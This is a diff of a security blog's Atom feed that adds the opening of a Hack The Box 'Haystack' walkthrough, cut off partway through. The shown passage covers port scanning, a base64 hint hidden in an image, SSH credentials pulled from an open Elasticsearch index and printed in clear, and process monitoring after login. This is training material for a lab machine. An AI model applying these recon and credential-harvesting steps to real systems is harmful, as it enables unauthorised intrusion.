@@ -1,4 +1,367 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://0xrick.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://0xrick.github.io/" rel="alternate" type="text/html" /><updated>2019-10-30T21:48:41+02:00</updated><id>https://0xrick.github.io/feed.xml</id><title type="html">0xRick</title><subtitle>Infosec / Cybersec Blog, Write-ups / Walkthroughs for Hack The Box retired machines and other CTF challenges, Articles about cybersecurity / hacking topics that interest me.</subtitle><entry><title type="html">Hack The Box - Safe</title><link href="https://0xrick.github.io/hack-the-box/safe/" rel="alternate" type="text/html" title="Hack The Box - Safe" /><published>2019-10-26T00:00:00+02:00</published><updated>2019-10-26T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/safe</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/safe/">&lt;hr /&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://0xrick.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://0xrick.github.io/" rel="alternate" type="text/html" /><updated>2019-11-02T15:18:03+02:00</updated><id>https://0xrick.github.io/feed.xml</id><title type="html">0xRick</title><subtitle>Infosec / Cybersec Blog, Write-ups / Walkthroughs for Hack The Box retired machines and other CTF challenges, Articles about cybersecurity / hacking topics that interest me.</subtitle><entry><title type="html">Hack The Box - Haystack</title><link href="https://0xrick.github.io/hack-the-box/haystack/" rel="alternate" type="text/html" title="Hack The Box - Haystack" /><published>2019-11-02T00:00:00+02:00</published><updated>2019-11-02T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/haystack</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/haystack/">&lt;hr /&gt;
+
+&lt;h2 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;Hey guys, today Haystack retired and here’s my write-up about it. It was an easy fun box and I liked the privilege escalation part. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.115&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;haystack.htb&lt;/code&gt;. Let’s jump right in ! &lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/haystack/0.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;nmap&quot;&gt;Nmap&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/haystack# nmap -sV -sT -sC -o nmapinitial haystack.htb 
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-01 17:33 EET
+Nmap scan report for haystack.htb (10.10.10.115)
+Host is up (0.59s latency).
+Not shown: 997 filtered ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
+|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
+|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
+80/tcp   open  http    nginx 1.12.2
+|_http-server-header: nginx/1.12.2
+|_http-title: Site doesn't have a title (text/html).
+9200/tcp open  http    nginx 1.12.2
+| http-methods: 
+|_  Potentially risky methods: DELETE
+|_http-server-header: nginx/1.12.2
+|_http-title: Site doesn't have a title (application/json; charset=UTF-8).
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 218.48 seconds
+root@kali:~/Desktop/HTB/boxes/haystack# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on 2 ports 80 and 9200, and we got &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on port 22, Let’s explore the web services.
+&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;On port 80 the index page had an image of a needle and nothing else:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/haystack/1.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;needle.jpg&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;On port 9200 there was an &lt;a href=&quot;https://www.elastic.co/products/elasticsearch&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;elasticsearch&lt;/code&gt;&lt;/a&gt; instance running:&lt;/p&gt;
+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;root@kali&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~/Desktop/HTB/boxes/haystack#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;//haystack.htb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9200&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;iQEYHgS&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;cluster_name&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;elasticsearch&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;cluster_uuid&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;pjrX7V_gSFmJY-DxP4tCQg&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;version&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;number&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;6.4.2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;build_flavor&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;default&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;build_type&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rpm&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;build_hash&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;04711c2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;build_date&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;2018-09-26T13:34:09.098244Z&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;build_snapshot&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;lucene_version&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;7.4.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;minimum_wire_compatibility_version&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;5.6.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;minimum_index_compatibility_version&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;5.0.0&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;tagline&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;You Know, for Search&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Elasticsearch is a distributed, RESTful search and analytics engine capable of addressing a growing number of use cases. As the heart of the Elastic Stack, it centrally stores your data so you can discover the expected and uncover the unexpected. -&lt;a href=&quot;https://www.elastic.co/&quot;&gt;elastic.co&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;On port 80 I tried running &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; but I got nothing:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/haystack# gobuster -u http://haystack.htb/ -w /usr/share/wordlists/dirb/common.txt
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+===================================================== 
+[+] Mode         : dir
+[+] Url/Domain   : http://haystack.htb/  
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
+[+] Status codes : 200,204,301,302,307,403  
+[+] Timeout      : 10s
+=====================================================
+2019/11/01 17:44:51 Starting gobuster
+=====================================================
+/index.html (Status: 200)
+=====================================================
+2019/11/01 17:47:06 Finished
+=====================================================
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;I also enumerated &lt;code class=&quot;highlighter-rouge&quot;&gt;vhosts&lt;/code&gt; and got no results.
+&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;steg-in-needlejpg-ssh-creds-from-elasticsearch-user-flag&quot;&gt;Steg in needle.jpg, SSH creds from elasticsearch, User Flag&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;I downloaded the image from the index page to check if there’s any kind of steganography:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/haystack# wget http://haystack.htb/needle.jpg
+--2019-11-01 17:48:29--  http://haystack.htb/needle.jpg
+Resolving haystack.htb (haystack.htb)... 10.10.10.115
+Connecting to haystack.htb (haystack.htb)|10.10.10.115|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 182982 (179K) [image/jpeg]
+Saving to: ‘needle.jpg’
+
+needle.jpg                                           100%[=====================================================================================================================&amp;gt;] 178.69K  80.2KB/s    in 2.2s    
+2019-11-01 17:48:32 (80.2 KB/s) - ‘needle.jpg’ saved [182982/182982]
+root@kali:~/Desktop/HTB/boxes/haystack# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;By running &lt;code class=&quot;highlighter-rouge&quot;&gt;strings&lt;/code&gt; on the image I found a base-64 encoded string:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/haystack# strings needle.jpg
+JFIF
+Exif
+paint.net 4.1.1
+UNICODE
+---
+bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;After decoding it I got a Spanish sentence:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/haystack# echo bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg== | base64 -d
+la aguja en el pajar es &quot;clave&quot;
+root@kali:~/Desktop/HTB/boxes/haystack# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;Translation:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;la aguja en el pajar es &quot;clave&quot; =&amp;gt; the needle in the haystack is &quot;key&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;Back to the &lt;code class=&quot;highlighter-rouge&quot;&gt;elasticsearch&lt;/code&gt; instance I &lt;a href=&quot;https://www.elastic.co/guide/en/elasticsearch/reference/current/search-search.html&quot;&gt;searched&lt;/a&gt; for the word &lt;code class=&quot;highlighter-rouge&quot;&gt;clave&lt;/code&gt; and got some interesting quotes in Spanish with some base-64 encoded strings:&lt;/p&gt;
+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;root@kali&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~/Desktop/HTB/boxes/haystack#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;//haystack.htb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9200&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/_search?q=clave&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;took&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;timed_out&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;_shards&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;total&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;successful&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;skipped&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;failed&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;hits&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;total&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;max_score&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;5.9335938&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;hits&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:[{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;_index&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;quotes&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;_type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;quote&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;_id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;45&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;_score&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;5.9335938&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;_source&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;quote&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}},{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;_index&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;quotes&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;_type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;quote&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;_id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;111&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;_score&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;5.3459888&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;_source&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;quote&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}]}}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;root@kali&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~/Desktop/HTB/boxes/haystack#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;After translation and decoding:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg =&amp;gt; I have to save the password for the machine: user: security
+
+Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk= =&amp;gt; This key cannot be lost, I keep it here: pass: spanish.is.key
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;We can &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; into the box with these creds &lt;code class=&quot;highlighter-rouge&quot;&gt;security : spanish.is.key&lt;/code&gt;:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/haystack/2.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;We owned user.
+&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;shell-as-kibana&quot;&gt;Shell as kibana&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;After getting &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; access I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;pspy&lt;/code&gt; to monitor the processes, I noticed that &lt;a href=&quot;https://www.elastic.co/products/logstash&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;logstash&lt;/code&gt;&lt;/a&gt; was running as root:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2019/11/01 15:05:08 CMD: UID=0    PID=6387   | /bin/java -Xms500m -Xmx500m -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -Djava.awt.headless=tr
+ue -Dfile.encoding=UTF-8 -Djruby.compile.invokedynamic=true -Djruby.jit.threshold=0 -XX:+HeapDumpOnOutOfMemoryError -Djava.security.egd=file:/dev/urandom -cp /usr/share/logstash/logstash-core/lib/jars/animal-sni
+ffer-annotations-1.14.jar:/usr/share/logstash/logstash-core/lib/jars/commons-codec-1.11.jar:/usr/share/logstash/logstash-core/lib/jars/commons-compiler-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/error_
+prone_annotations-2.0.18.jar:/usr/share/logstash/logstash-core/lib/jars/google-java-format-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/gradle-license-report-0.7.1.jar:/usr/share/logstash/logstash-core/lib
+/jars/guava-22.0.jar:/usr/share/logstash/logstash-core/lib/jars/j2objc-annotations-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-annotations-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jack
